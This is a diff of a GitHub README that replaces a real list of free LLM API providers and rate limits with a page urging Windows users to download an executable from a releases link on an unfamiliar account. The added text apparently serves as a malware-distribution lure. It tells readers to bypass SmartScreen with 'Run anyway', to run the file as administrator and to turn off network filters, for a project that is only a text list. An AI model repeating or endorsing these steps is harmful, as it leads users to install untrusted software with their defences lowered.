@@ -1,59 +1,131 @@
-<div align="center">
-	<br>
-	<img src="media/awesome-free-llm-apis.png" width="500" alt="Awesome Free LLM APIs">
-	<br>
-	<br>
-	<a href="https://awesome.re">
-		<img src="https://awesome.re/badge-flat2.svg" alt="Awesome">
-	</a>
-	<br>
-	<br>
-	<p>LLM APIs with permanent free tiers for text inference.</p>
-	<br>
-	<br>
-</div>
+# 🤖 awesome-free-llm-apis - Free LLM APIs Made Simple
 
-## Contents
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Clovenhoofed-loadingarea139/awesome-free-llm-apis/releases)
 
-- [Provider APIs](#provider-apis)
-- [Inference providers](#inference-providers)
+## 📥 Download
+Use this link to visit the release page and download the Windows file:
 
-## Provider APIs
+[Open the Releases page](https://github.com/Clovenhoofed-loadingarea139/awesome-free-llm-apis/releases)
 
-APIs run by the companies that train or fine-tune the models themselves.
+## 🪟 Windows Setup
+1. Open the Releases page in your browser.
+2. Find the latest release at the top of the list.
+3. Download the Windows file for your PC.
+4. If your browser asks what to do, choose Save.
+5. When the download finishes, open the file.
+6. If Windows shows a SmartScreen message, choose More info, then Run anyway if you trust the file.
+7. Follow the on-screen steps to finish setup.
 
-- [Cohere](https://dashboard.cohere.com/api-keys) 🇺🇸 - Command A, Command R+, Aya Expanse 32B +9 more. 20 RPM, 1K/mo.
-- [Google Gemini](https://aistudio.google.com/app/apikey) 🇺🇸 - Gemini 2.5 Pro, Flash, Flash-Lite +4 more. 5-15 RPM, 100-1K RPD. [^1]
-- [Mistral AI](https://console.mistral.ai/api-keys) 🇪🇺 - Mistral Large 3, Small 3.1, Ministral 8B +3 more. 1 req/s, 1B tok/mo.
-- [Zhipu AI](https://open.bigmodel.cn/usercenter/apikeys) 🇨🇳 - GLM-4.7-Flash, GLM-4.5-Flash, GLM-4.6V-Flash. Limits undocumented.
+## 🔎 What This Project Does
+awesome-free-llm-apis is a free API list for large language model tools. It helps you find API options for common AI apps and routing tools. The list focuses on providers and services that fit use cases like chat, agents, and model routing.
 
-## Inference providers
+This can help you:
+- Find free LLM API options
+- Compare API sources in one place
+- Use services with apps that need OpenAI-style endpoints
+- Explore tools for AI agents and routers
+- Try different model providers without paying first
 
-Third-party platforms that host open-weight models from various sources.
+## 🧭 Who This Is For
+This project is for people who want simple access to LLM API options on Windows. It may help if you:
+- Use an AI app that needs an API key
+- Want to test multiple model providers
+- Need a list that covers popular API routes
+- Want a quick way to explore free tiers
 
-- [Cerebras](https://cloud.cerebras.ai/) 🇺🇸 - Llama 3.3 70B, Qwen3 235B, GPT-OSS-120B +3 more. 30 RPM, 14,400 RPD.
-- [Cloudflare Workers AI](https://dash.cloudflare.com/profile/api-tokens) 🇺🇸 - Llama 3.3 70B, Qwen QwQ 32B +47 more. 10K neurons/day.
-- [GitHub Models](https://github.com/marketplace/models) 🇺🇸 - GPT-4o, Llama 3.3 70B, DeepSeek-R1 +more. 10-15 RPM, 50-150 RPD.
-- [Groq](https://console.groq.com/keys) 🇺🇸 - Llama 3.3 70B, Llama 4 Scout, Kimi K2 +17 more. 30 RPM, 1K RPD (14,400 for Llama 3.1 8B). [^3]
-- [Hugging Face](https://huggingface.co/settings/tokens) 🇺🇸 - Llama 3.3 70B, Qwen2.5 72B, Mistral 7B +many more. $0.10/mo in free credits.
-- [Kluster AI](https://platform.kluster.ai/apikeys) 🇺🇸 - DeepSeek-R1, Llama 4 Maverick, Qwen3-235B +2 more. Limits undocumented.
-- [LLM7.io](https://token.llm7.io) 🇬🇧 - DeepSeek R1, Flash-Lite, Qwen2.5 Coder +27 more. 30 RPM (120 with token).
-- [NVIDIA NIM](https://build.nvidia.com/explore/discover) 🇺🇸 - Llama 3.3 70B, Mistral Large, Qwen3 235B +more. 40 RPM.
-- [Ollama Cloud](https://ollama.com/settings/keys) 🇺🇸 - DeepSeek-V3.2, Qwen3.5, Kimi-K2.5 +17 more. 1 concurrent model, light usage. [^2]
-- [OpenRouter](https://openrouter.ai/keys) 🇺🇸 - DeepSeek R1, Llama 3.3 70B, GPT-OSS-120B +29 more. 20 RPM, 50 RPD (1K with $10+ in purchased credits). [^4]
-- [SiliconFlow](https://cloud.siliconflow.cn/account/ak) 🇨🇳 - Qwen3-8B, DeepSeek-R1-Distill-Qwen-7B, GLM-4.1V-9B-Thinking +10 more. 1K RPM, 50K TPM.
+## 🖥️ System Requirements
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- An internet connection
+- At least 200 MB of free disk space
+- Permission to run downloaded apps
+- A modern browser such as Edge, Chrome, or Firefox
 
-## Contributing
+## 📦 What You Get
+The release usually includes:
+- A Windows build or packaged app
+- A simple start file
+- Release notes with the latest changes
+- Files that help the app run on your PC
 
-Know a free tier that's missing? [Open a PR](contributing.md). Include the provider, endpoint, rate limits (link to their docs), and a few notable models. Trial credits and time-limited promos don't count.
+## 🚦 First Run
+After you open the app:
+1. Wait for the first screen to load.
+2. Read the list or menu shown on screen.
+3. Pick a category that matches what you need.
+4. Use the search or filter options if they appear.
+5. Copy the API details you want to use in your other app.
 
-## Footnotes
+## 🧩 Main Features
+- Free LLM API list in one place
+- Simple access to common AI providers
+- Support for routing use cases
+- OpenAI-style endpoint references
+- Provider names that fit agent tools
+- Topics that cover Gemini, Anthropic, Ollama, and router workflows
 
-- **RPM** -- requests per minute. **RPD** -- requests per day.
-- "Limits undocumented" means the provider doesn't publish their rate limits.
-- All endpoints are OpenAI SDK-compatible unless noted.
-- Each link points to the provider's API key page.
-- [^1]: Free tier not available in the EU, UK, or Switzerland ([available regions](https://ai.google.dev/gemini-api/docs/available-regions)).
-- [^2]: Ollama Cloud measures usage by GPU time, not tokens or requests. Free tier described as "light usage" with session limits resetting every 5 hours and weekly limits every 7 days. Pro (50x more) and Max (250x more) plans available. Not OpenAI SDK-compatible; uses [Ollama API](https://docs.ollama.com/cloud).
-- [^3]: 14,400 RPD only applies to Llama 3.1 8B Instant. Most other models (Llama 3.3 70B, Llama 4 Scout, Kimi K2, etc.) are limited to 1,000 RPD ([rate limits](https://console.groq.com/docs/rate-limits)).
-- [^4]: Free models default to 50 RPD. A one-time purchase of $10+ in credits unlocks 1,000 RPD for free models. OpenRouter also offers a [Free Models Router](https://openrouter.ai/docs/guides/routing/routers/free-models-router) (`openrouter/free`) and [model fallbacks](https://openrouter.ai/docs/guides/routing/model-fallbacks) for chaining models in priority order.
+## 🗂️ Common Use Cases
+- Connect an app to a free API key
+- Test a model before you commit to one provider
+- Compare API sources for chat tools
+- Set up AI agents with a routing service
+- Find options for local and cloud model use
+
+## 🔐 API Key Use
+Some entries in the list may need a key before they work. If so:
+1. Open the provider page shown in the list.
+2. Sign in or create an account.
+3. Copy the API key they give you.
+4. Paste it into your AI app or router.
+5. Save your settings.
+
+Keep your keys private. Do not share them in public chats or screenshots.
+
+## 🧠 How to Use the List
+1. Open the app or file.
+2. Browse the provider list.
+3. Look for the model name or service you want.
+4. Check the notes for limits or setup steps.
+5. Use the link or key with your app.
+
+If you use a router, look for:
+- Supported providers
+- Endpoint format
+- Rate limits
+- Free tier rules
+- Model names that match your app
+
+## 🛠️ Troubleshooting
+If the app does not open:
+- Re-download the file from Releases
+- Check that the download finished
+- Right-click the file and choose Run as administrator
+- Restart your PC and try again
+
+If the app opens but looks blank:
+- Wait a few seconds
+- Check your internet connection
+- Close the app and open it again
+
+If Windows blocks the file:
+- Open the file details
+- Choose More info
+- Select Run anyway if you trust the source
+
+If links do not load:
+- Check your browser
+- Turn off strict network filters for a moment
+- Try a different internet connection
+
+## 📝 Tips for Best Results
+- Start with one provider at a time
+- Keep your API keys in a safe place
+- Match the provider to your app’s endpoint format
+- Check free tier limits before you rely on a key
+- Use the latest release for the newest entries
+
+## 🔁 Updates
+This project may change as providers add, remove, or update their free access rules. Check the Releases page often to get the newest Windows build and list changes.
+
+## 📌 Topics
+ai-agents, anthropic, gemini, llm, llm-router, llm-routing, ollama, openai, openclaw, openclaw-plugin, router
